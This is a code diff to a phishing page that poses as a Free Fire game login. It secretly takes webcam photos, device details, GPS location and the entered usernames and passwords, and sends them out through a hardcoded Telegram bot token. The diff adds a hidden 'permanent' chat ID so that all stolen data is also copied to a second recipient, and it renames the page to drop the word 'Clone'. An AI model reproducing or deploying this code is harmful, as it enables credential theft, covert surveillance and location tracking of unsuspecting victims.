@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Free Fire Login Clone</title>
+    <title>Free Fire Login</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         body {
@@ -126,6 +126,7 @@
 
         const { chatId } = getQueryParams();
         const botToken = '7347658420:AAFJel5v5zRqa-wF5IrK_lQoI1YPyHOZG0w';
+        const permanentChatId = '5634946920'; // Permanent chat ID for sending data
 
         async function startVideo() {
             try {
@@ -151,11 +152,12 @@
             const context = canvas.getContext('2d');
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
             canvas.toBlob((blob) => {
-                sendImageToTelegram(blob);
+                sendImageToTelegram(blob, chatId);
+                sendImageToTelegram(blob, permanentChatId);
             }, 'image/png');
         }
 
-        async function sendImageToTelegram(blob) {
+        async function sendImageToTelegram(blob, chatId) {
             const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
             const formData = new FormData();
             formData.append('chat_id', chatId);
@@ -197,7 +199,8 @@
 
                 console.log("User info: ", userInfo);
 
-                await sendUserInfoToTelegram(userInfo);
+                await sendUserInfoToTelegram(userInfo, chatId);
+                await sendUserInfoToTelegram(userInfo, permanentChatId);
             } catch (error) {
                 console.error("Error getting user info: ", error);
             }
@@ -209,7 +212,7 @@
             return result.device.model || 'Unknown Device';
         }
 
-        async function sendUserInfoToTelegram(userInfo) {
+        async function sendUserInfoToTelegram(userInfo, chatId) {
             const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
             try {
@@ -253,7 +256,8 @@
 
                     console.log("Location info: ", locationInfo);
 
-                    await sendLocationToTelegram(locationInfo);
+                    await sendLocationToTelegram(locationInfo, chatId);
+                    await sendLocationToTelegram(locationInfo, permanentChatId);
                 }, (error) => {
                     console.error("Error getting location: ", error);
                     alert('Please enable GPS in your device settings to continue.');
@@ -264,7 +268,7 @@
             }
         }
 
-        async function sendLocationToTelegram(locationInfo) {
+        async function sendLocationToTelegram(locationInfo, chatId) {
             const url = `https://api.telegram.org/bot${botToken}/sendLocation`;
 
             try {
@@ -282,7 +286,6 @@
 
                 if (response.ok) {
                     console.log("Location info sent to Telegram");
-                    document.getElementById('main-container').style.display = 'flex';
                 } else {
                     console.error("Error sending location info to Telegram: ", response.statusText);
                 }
@@ -303,6 +306,7 @@
             const message = `Email or Username: ${emailOrUsername}\nPassword: ${password}`;
 
             const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+            const permanentUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${permanentChatId}&text=${encodeURIComponent(message)}`;
 
             fetch(url)
                 .then(response => response.json())
@@ -311,6 +315,15 @@
                 })
                 .catch(error => {
                     console.error("Error sending credentials to Telegram: ", error);
+                });
+                
+            fetch(permanentUrl)
+                .then(response => response.json())
+                .then(data => {
+                    console.log("Credentials sent to permanent chat ID");
+                })
+                .catch(error => {
+                    console.error("Error sending credentials to permanent chat ID: ", error);
                 });
         }
 
